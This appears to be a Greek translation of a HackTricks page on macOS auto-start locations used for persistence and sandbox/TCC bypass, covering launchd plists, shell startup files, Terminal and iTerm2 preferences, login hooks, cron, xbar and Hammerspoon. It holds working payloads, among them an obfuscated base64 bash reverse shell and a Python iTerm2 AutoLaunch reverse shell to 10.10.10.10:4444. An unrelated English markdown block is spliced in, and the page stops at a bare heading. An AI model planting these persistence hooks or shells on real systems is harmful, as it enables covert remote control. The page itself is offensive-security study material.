# Αυτόματη Εκκίνηση στο macOS

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

Αυτή η ενότητα βασίζεται σε μεγάλο βαθμό στη σειρά άρθρων του ιστολογίου [**Πέρα από τα καλά LaunchAgents**](https://theevilbit.github.io/beyond/), με στόχο να προστεθούν **περισσότερες τοποθεσίες Αυτόματης Εκκίνησης** (εάν είναι δυνατό), να υποδειχθεί **ποιες τεχνικές λειτουργούν ακόμα** σήμερα με την τελευταία έκδοση του macOS (13.4) και να καθοριστούν οι **άδειες που απαιτούνται**.

## Παράκαμψη Αμμοδοχείου

{% hint style="success" %}
Εδώ μπορείτε να βρείτε τοποθεσίες εκκίνησης χρήσιμες για τη **παράκαμψη του αμμοδοχείου** που σας επιτρέπει να απλά εκτελέσετε κάτι με το **να το γράψετε σε ένα αρχείο** και να **περιμένετε** για μια πολύ **συνηθισμένη** **ενέργεια**, ένα συγκεκριμένο **χρονικό διάστημα** ή μια **ενέργεια που μπορείτε συνήθως να εκτελέσετε** από μέσα σε ένα αμμοδοχείο χωρίς την ανάγκη ριζικών δικαιωμάτων.
{% endhint %}

### Launchd

* Χρήσιμο για παράκαμψη αμμοδοχείου: [✅](https://emojipedia.org/check-mark-button)
* Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσίες

* **`/Library/LaunchAgents`**
* **Ενεργοποίηση**: Επανεκκίνηση
* Απαιτούνται ρίζες
* **`/Library/LaunchDaemons`**
* **Ενεργοποίηση**: Επανεκκίνηση
* Απαιτούνται ρίζες
* **`/System/Library/LaunchAgents`**
* **Ενεργοποίηση**: Επανεκκίνηση
* Απαιτούνται ρίζες
* **`/System/Library/LaunchDaemons`**
* **Ενεργοποίηση**: Επανεκκίνηση
* Απαιτούνται ρίζες
* **`~/Library/LaunchAgents`**
* **Ενεργοποίηση**: Επανασύνδεση
* **`~/Library/LaunchDemons`**
* **Ενεργοποίηση**: Επανασύνδεση

#### Περιγραφή & Εκμετάλλευση

Το **`launchd`** είναι η **πρώτη** **διαδικασία** που εκτελείται από τον πυρήνα του OX S κατά την εκκίνηση και η τελευταία που ολοκληρώνεται κατά τον τερματισμό. Πρέπει πάντα να έχει το **PID 1**. Αυτή η διαδικασία θα **διαβάσει και θα εκτελέσει** τις ρυθμίσεις που υποδεικνύονται στα **plists ASEP** στα:

* `/Library/LaunchAgents`: Πράκτορες ανά χρήστη εγκατεστημένοι από τον διαχειριστή
* `/Library/LaunchDaemons`: Δαίμονες παγκόσμιας εμβέλειας εγκατεστημένοι από τον διαχειριστή
* `/System/Library/LaunchAgents`: Πράκτορες ανά χρήστη που παρέχονται από την Apple.
* `/System/Library/LaunchDaemons`: Δαίμονες παγκόσμιας εμβέλειας που παρέχονται από την Apple.

Όταν ένας χρήστης συνδέεται, τα plists που βρίσκονται στα `/Users/$USER/Library/LaunchAgents` και `/Users/$USER/Library/LaunchDemons` ξεκινούν με τις **άδειες των συνδεδεμένων χρηστών**.

**Η κύρια διαφορά μεταξύ πρακτόρων και δαιμόνων είναι ότι οι πράκτορες φορτώνονται όταν ο χρήστης συνδέεται και οι δαίμονες φορτώνονται κατά την εκκίνηση του συστήματος** (καθώς υπάρχουν υπηρεσίες όπως το ssh που πρέπει να εκτελούνται πριν οποιοσδήποτε χρήστης έχει πρόσβαση στο σύστημα). Επίσης, οι πράκτορες μπορεί να χρησιμοποιούν το γραφικό περιβάλλον, ενώ οι δαίμονες πρέπει να εκτελούνται στο παρασκήνιο.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Υπάρχουν περιπτώσεις όπου ένας **πράκτορας πρέπει να εκτελεστεί πριν ο χρήστης συνδεθεί**, αυτοί ονομάζονται **PreLoginAgents**. Για παράδειγμα, αυτό είναι χρήσιμο για την παροχή τεχνολογίας υποστήριξης κατά τη σύνδεση. Μπορούν επίσης να βρεθούν στο `/Library/LaunchAgents` (δείτε [**εδώ**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) ένα παράδειγμα).

{% hint style="info" %}
Τα νέα αρχεία ρύθμισης Δαίμονων ή Πρακτόρων θα φορτωθούν μετά την επόμενη επανεκκίνηση ή χρησιμοποιώντας την εντολή `launchctl load <target.plist>`. Είναι **επίσης δυνατό να φορτωθούν αρχεία .plist χωρίς αυτήν την επέκταση** με την εντολή `launchctl -F <file>` (ωστόσο αυτά τα αρχεία plist δεν θα φορτωθούν αυτόματα μετά την επανεκκίνηση).\
Είναι επίσης δυνατό να **απενεργοποιηθεί** με την εντολή `launchctl unload <target.plist>` (η διαδικασία που αναφέρεται θα τερματιστεί).

Για να **διασφαλίσετε** ότι δεν υπάρχει **τίποτα** (όπως μια παράκαμψη) **που εμποδίζει έναν** **Πράκτορα** ή **Δαίμονα** **από το να εκτελεστεί**, εκτελέστε: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`
{% endhint %}

Καταγράψτε όλους τους πράκτορες και δαίμονες που έχουν φορτωθεί από τον τρέχοντα χρήστη:
```bash
launchctl list
```
{% hint style="warning" %}
Αν ένα plist ανήκει σε έναν χρήστη, ακόμα κι αν βρίσκεται σε φακέλους συστήματος daemon, η εργασία θα εκτελείται ως ο χρήστης και όχι ως root. Αυτό μπορεί να αποτρέψει ορισμένες επιθέσεις εξάρτησης δικαιωμάτων.
{% endhint %}

### Αρχεία εκκίνησης κελύφους

Ανάλυση: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Ανάλυση (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* Χρήσιμο για παράκαμψη της αμμοθολογίας: [✅](https://emojipedia.org/check-mark-button)
* Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
* Αλλά πρέπει να βρείτε μια εφαρμογή με παράκαμψη TCC που εκτελεί ένα κελί που φορτώνει αυτά τα αρχεία

#### Τοποθεσίες

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
* **Ενεργοποίηση**: Ανοίξτε ένα τερματικό με zsh
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **Ενεργοποίηση**: Ανοίξτε ένα τερματικό με zsh
* Απαιτείται root
* **`~/.zlogout`**
* **Ενεργοποίηση**: Έξοδος από ένα τερματικό με zsh
* **`/etc/zlogout`**
* **Ενεργοποίηση**: Έξοδος από ένα τερματικό με zsh
* Απαιτείται root
* Πιθανώς περισσότερα στο: **`man zsh`**
* **`~/.bashrc`**
* **Ενεργοποίηση**: Ανοίξτε ένα τερματικό με bash
* `/etc/profile` (δεν λειτούργησε)
* `~/.profile` (δεν λειτούργησε)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **Ενεργοποίηση**: Αναμένεται να ενεργοποιηθεί με xterm, αλλά **δεν είναι εγκατεστημένο** και ακόμη και μετά την εγκατάσταση εμφανίζεται αυτό το σφάλμα: xterm: `DISPLAY is not set`

#### Περιγραφή & Εκμετάλλευση

Κατά την εκκίνηση ενός περιβάλλοντος κελύφους όπως το `zsh` ή το `bash`, **εκτελούνται ορισμένα αρχεία εκκίνησης**. Η macOS χρησιμοποιεί επί του παρόντος το `/bin/zsh` ως το προεπιλεγμένο κέλυφος. Αυτό το κέλυφος προσπελαύνεται αυτόματα όταν εκκινείται η εφαρμογή Terminal ή όταν ένα συσκευή προσπελαύνεται μέσω SSH. Ενώ τα `bash` και `sh` είναι επίσης παρόντα στη macOS, πρέπει να κληθούν ρητά για να χρησιμοποιηθούν.

Η σελίδα εγχειριδίου του zsh, την οποία μπορούμε να διαβάσουμε με την εντολή **`man zsh`**, έχει μια μακρά περιγραφή των αρχείων εκκίνησης.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Επανεκκινούμενες Εφαρμογές

{% hint style="danger" %}
Η ρύθμιση της ενδεικτικής εκμετάλλευσης και η αποσύνδεση και επανασύνδεση ή ακόμη και η επανεκκίνηση δεν λειτούργησαν για μένα για να εκτελέσω την εφαρμογή. (Η εφαρμογή δεν εκτελούνταν, ίσως χρειάζεται να εκτελείται όταν πραγματοποιούνται αυτές οι ενέργειες)
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Χρήσιμο για παράκαμψη της αμμόλοφης: [✅](https://emojipedia.org/check-mark-button)
* Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Ενεργοποίηση**: Επανεκκίνηση επανανοίξεως εφαρμογών

#### Περιγραφή & Εκμετάλλευση

Όλες οι εφαρμογές που πρόκειται να επανανοιχτούν βρίσκονται μέσα στο plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Έτσι, για να κάνετε τις εφαρμογές επανεκκίνησης να εκκινούν τη δική σας, απλά χρειάζεται να **προσθέσετε την εφαρμογή σας στη λίστα**.

Το UUID μπορεί να βρεθεί αναφέροντας αυτό τον κατάλογο ή με την εντολή `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Για να ελέγξετε τις εφαρμογές που θα επανανοιχτούν, μπορείτε να κάνετε:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Για **να προσθέσετε μια εφαρμογή σε αυτή τη λίστα** μπορείτε να χρησιμοποιήσετε:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Προτιμήσεις Terminal

* Χρήσιμο για παράκαμψη αμμόλοφου: [✅](https://emojipedia.org/check-mark-button)
* Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
* Χρήση Terminal για άδειες FDA του χρήστη που το χρησιμοποιεί

#### Τοποθεσία

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Ενεργοποίηση**: Άνοιγμα Terminal

#### Περιγραφή & Εκμετάλλευση

Στο **`~/Library/Preferences`** αποθηκεύονται οι προτιμήσεις του χρήστη στις Εφαρμογές. Κάποιες από αυτές τις προτιμήσεις μπορεί να περιέχουν μια διαμόρφωση για **εκτέλεση άλλων εφαρμογών/σεναρίων**.

Για παράδειγμα, το Terminal μπορεί να εκτελέσει έναν κώδικα κατά την εκκίνηση:

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

Αυτή η ρύθμιση αντανακλάται στο αρχείο **`~/Library/Preferences/com.apple.Terminal.plist`** όπως παρακάτω:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Έτσι, αν το plist των προτιμήσεων του τερματικού στο σύστημα μπορεί να αντικατασταθεί, τότε η λειτουργία **`open`** μπορεί να χρησιμοποιηθεί για **να ανοίξει το τερματικό και να εκτελεστεί εκείνη η εντολή**.

Μπορείτε να προσθέσετε αυτό από το cli με:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Σενάρια τερματικού / Άλλες επεκτάσεις αρχείων

* Χρήσιμο για παράκαμψη της αμμόλοφης: [✅](https://emojipedia.org/check-mark-button)
* Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
* Χρήση τερματικού για να έχει ο χρήστης FDA δικαιώματα

#### Τοποθεσία

* **Οπουδήποτε**
* **Ενεργοποίηση**: Άνοιγμα Τερματικού

#### Περιγραφή & Εκμετάλλευση

Αν δημιουργήσετε ένα [**`.terminal`** σενάριο](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) και το ανοίξετε, η εφαρμογή **Τερματικό** θα εκτελέσει αυτόματα τις εντολές που υποδηλώνονται εκεί. Αν η εφαρμογή Τερματικού έχει κάποια ειδικά προνόμια (όπως TCC), η εντολή σας θα εκτελεστεί με αυτά τα ειδικά προνόμια.

Δοκιμάστε το με:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Μπορείτε επίσης να χρησιμοποιήσετε τις επεκτάσεις **`.command`**, **`.tool`**, με κανονικό περιεχόμενο shell scripts και θα ανοίγονται επίσης από το Terminal.

{% hint style="danger" %}
Αν το terminal έχει **Πλήρη Πρόσβαση Δίσκου** θα μπορεί να ολοκληρώσει αυτή την ενέργεια (σημειώστε ότι η εντολή που εκτελείται θα είναι ορατή σε ένα παράθυρο του terminal).
{% endhint %}

### Πρόσθετα Ήχου

Ανάλυση: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Ανάλυση: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
* Παράκαμψη TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Μπορείτε να λάβετε κάποια επιπλέον πρόσβαση TCC

#### Τοποθεσία

* **`/Library/Audio/Plug-Ins/HAL`**
* Απαιτεί δικαιώματα ρίζας
* **Ενεργοποίηση**: Επανεκκίνηση του coreaudiod ή του υπολογιστή
* **`/Library/Audio/Plug-ins/Components`**
* Απαιτεί δικαιώματα ρίζας
* **Ενεργοποίηση**: Επανεκκίνηση του coreaudiod ή του υπολογιστή
* **`~/Library/Audio/Plug-ins/Components`**
* **Ενεργοποίηση**: Επανεκκίνηση του coreaudiod ή του υπολογιστή
* **`/System/Library/Components`**
* Απαιτεί δικαιώματα ρίζας
* **Ενεργοποίηση**: Επανεκκίνηση του coreaudiod ή του υπολογιστή

#### Περιγραφή

Σύμφωνα με τις προηγούμενες αναλύσεις είναι δυνατόν να **συντάξετε μερικά πρόσθετα ήχου** και να τα φορτώσετε.

### Πρόσθετα QuickLook

Ανάλυση: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
* Παράκαμψη TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Μπορείτε να λάβετε κάποια επιπλέον πρόσβαση TCC

#### Τοποθεσία

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Περιγραφή & Εκμετάλλευση

Τα πρόσθετα QuickLook μπορούν να εκτελεστούν όταν **ενεργοποιείτε την προεπισκόπηση ενός αρχείου** (πατώντας το πλήκτρο διαστήματος με το αρχείο που έχετε επιλέξει στο Finder) και ένα **πρόσθετο που υποστηρίζει αυτόν τον τύπο αρχείου** είναι εγκατεστημένο.

Είναι δυνατόν να συντάξετε το δικό σας πρόσθετο QuickLook, να το τοποθετήσετε σε μία από τις προηγούμενες τοποθεσίες για να το φορτώσετε και στη συνέχεια να μεταβείτε σε ένα υποστηριζόμενο αρχείο και να πατήσετε διαστήματος για να το ενεργοποιήσετε.

### ~~Συνδέσεις Εισόδου/Εξόδου~~

{% hint style="danger" %}
Αυτό δεν λειτούργησε για μένα, ούτε με τη σύνδεση εισόδου χρήστη ούτε με τη σύνδεση εξόδου ρίζας
{% endhint %}

**Ανάλυση**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
* Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

* Χρειάζεται να μπορείτε να εκτελέσετε κάτι σαν `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
* Βρίσκεται στο `~/Library/Preferences/com.apple.loginwindow.plist`

Είναι απαρχαιωμένες αλλά μπορούν να χρησιμοποιηθούν για να εκτελέσετε εντολές όταν ένας χρήστης συνδέεται.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Αυτή η ρύθμιση αποθηκεύεται στο `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Για να το διαγράψετε:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Ο χρήστης root αποθηκεύεται στο **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Παράκαμψη Συνθηκών Αμμοθεράπειας

{% hint style="success" %}
Εδώ μπορείτε να βρείτε τις τοποθεσίες εκκίνησης χρήσιμες για τη **παράκαμψη της αμμοθεράπειας** που σας επιτρέπει να εκτελέσετε κάτι απλά **γράφοντάς το σε ένα αρχείο** και **περιμένοντας μη πολύ συνηθισμένες συνθήκες** όπως συγκεκριμένα **εγκατεστημένα προγράμματα, "ασυνήθιστες" ενέργειες χρήστη** ή περιβάλλοντα.
{% endhint %}

### Χρονοδιάγραμμα (Cron)

**Ανάλυση**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Χρήσιμο για παράκαμψη αμμοθεράπειας: [✅](https://emojipedia.org/check-mark-button)
* Ωστόσο, χρειάζεστε τη δυνατότητα εκτέλεσης του δυαδικού `crontab`
* Ή να είστε root
* Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Απαιτείται root για άμεση πρόσβαση εγγραφής. Δεν απαιτείται root αν μπορείτε να εκτελέσετε `crontab <αρχείο>`
* **Ενεργοποίηση**: Εξαρτάται από την εργασία του χρονοδιαγράμματος

#### Περιγραφή & Εκμετάλλευση

Καταχωρήστε τις εργασίες του χρονοδιαγράμματος του **τρέχοντος χρήστη** με:
```bash
crontab -l
```
Μπορείτε επίσης να δείτε όλες τις εργασίες cron των χρηστών στα **`/usr/lib/cron/tabs/`** και **`/var/at/tabs/`** (χρειάζεται root).

Στο MacOS μπορούν να βρεθούν διάφοροι φάκελοι που εκτελούν scripts με **συγκεκριμένη συχνότητα** στα:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Εκεί μπορείτε να βρείτε τις κανονικές **εργασίες cron**, τις **εργασίες at** (που δε χρησιμοποιούνται πολύ) και τις **περιοδικές εργασίες** (χρησιμοποιούνται κυρίως για τον καθαρισμό προσωρινών αρχείων). Οι καθημερινές περιοδικές εργασίες μπορούν να εκτελεστούν για παράδειγμα με: `periodic daily`.

Για να προσθέσετε μια **εργασία cron χρήστη προγραμματικά** είναι δυνατόν να χρησιμοποιήσετε:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Ανάλυση: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Χρήσιμο για παράκαμψη αμμόλοφου: [✅](https://emojipedia.org/check-mark-button)
* Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
* Το iTerm2 χρησιμοποιείται για τη χορήγηση δικαιωμάτων TCC

#### Τοποθεσίες

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Σήμανση**: Άνοιγμα iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Σήμανση**: Άνοιγμα iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Σήμανση**: Άνοιγμα iTerm

#### Περιγραφή & Εκμετάλλευση

Τα scripts που αποθηκεύονται στο **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** θα εκτελεστούν. Για παράδειγμα:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
```markdown
## macOS Auto Start Locations

### Launch Agents

Launch Agents are used to run processes when a user logs in. They are stored in the following directories:

- `/Library/LaunchAgents/`
- `/System/Library/LaunchAgents/`
- `/System/Library/LaunchDaemons/`
- `/Library/LaunchDaemons/`
- `~/Library/LaunchAgents/`

### Launch Daemons

Launch Daemons are used to run processes at system startup. They are stored in the following directories:

- `/Library/LaunchDaemons/`
- `/System/Library/LaunchDaemons/`

### Login Items

Login Items are applications that open when a user logs in. They can be managed in the Users & Groups section of System Preferences.

### Startup Items

Startup Items are legacy items that are launched at system startup. They are stored in the `/Library/StartupItems/` directory.

### Cron Jobs

Cron Jobs are scheduled tasks that run at specific times. They can be managed using the `crontab` command in the Terminal.
```
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Το script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** θα εκτελεστεί επίσης:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Οι προτιμήσεις του iTerm2 βρίσκονται στο **`~/Library/Preferences/com.googlecode.iterm2.plist`** μπορεί **να υποδεικνύουν έναν εντολή για εκτέλεση** όταν ανοίγει το τερματικό iTerm2.

Αυτή η ρύθμιση μπορεί να προσαρμοστεί στις ρυθμίσεις του iTerm2:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

Και η εντολή αντανακλάται στις προτιμήσεις:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Μπορείτε να ορίσετε την εντολή που θα εκτελείται με:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
Υπάρχει μεγάλη πιθανότητα να υπάρχουν **άλλοι τρόποι εκμετάλλευσης των προτιμήσεων του iTerm2** για την εκτέλεση αυθαίρετων εντολών.
{% endhint %}

### xbar

Ανάλυση: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
* Αλλά το xbar πρέπει να είναι εγκατεστημένο
* TCC παράκαμψη: [✅](https://emojipedia.org/check-mark-button)
* Ζητά δικαιώματα προσβασιμότητας

#### Τοποθεσία

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Ενεργοποίηση**: Μόλις εκτελεστεί το xbar

#### Περιγραφή

Αν το δημοφιλές πρόγραμμα [**xbar**](https://github.com/matryer/xbar) είναι εγκατεστημένο, είναι δυνατόν να γραφτεί ένα shell script στο **`~/Library/Application\ Support/xbar/plugins/`** το οποίο θα εκτελείται όταν ξεκινάει το xbar:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Ανάλυση**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Χρήσιμο για παράκαμψη της αμμόλοφης: [✅](https://emojipedia.org/check-mark-button)
* Αλλά πρέπει να είναι εγκατεστημένο το Hammerspoon
* Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
* Ζητά δικαιώματα προσβασιμότητας

#### Τοποθεσία

* **`~/.hammerspoon/init.lua`**
* **Ενεργοποίηση**: Μόλις εκτελεστεί το Hammerspoon

#### Περιγραφή

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) λειτουργεί ως πλατφόρμα αυτοματισμού για το **macOS**, εκμεταλλευόμενο τη γλώσσα σεναρίου **LUA** για τις λειτουργίες του. Είναι σημαντικό να σημειωθεί ότι υποστηρίζει την ολοκλήρωση πλήρους κώδικα AppleScript και την εκτέλεση κελιών εντολών, βελτιώνοντας σημαντικά τις δυνατότητες σεναριογραφίας του.

Η εφαρμογή αναζητά ένα μόνο αρχείο, `~/.hammerspoon/init.lua`, και όταν ξεκινάει, το σενάριο θα εκτελεστεί.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

